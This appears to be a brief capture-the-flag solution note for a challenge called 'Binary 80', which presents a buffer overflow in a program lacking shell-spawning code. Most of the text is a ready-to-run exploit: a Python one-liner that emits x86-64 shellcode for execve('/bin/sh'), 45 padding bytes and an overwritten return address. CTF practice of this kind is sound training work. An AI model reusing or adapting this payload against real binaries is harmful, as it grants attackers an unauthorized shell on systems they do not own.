Binary 80

Looks like this program has a buffer overflow vulnerability! But there's no code inside that spawns a shell, so it must be secure! Get the flag anyway by exploiting it on our shell sever.


Simple ROP

$(python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "A" * 45 + "\xfe\x05\x40"')

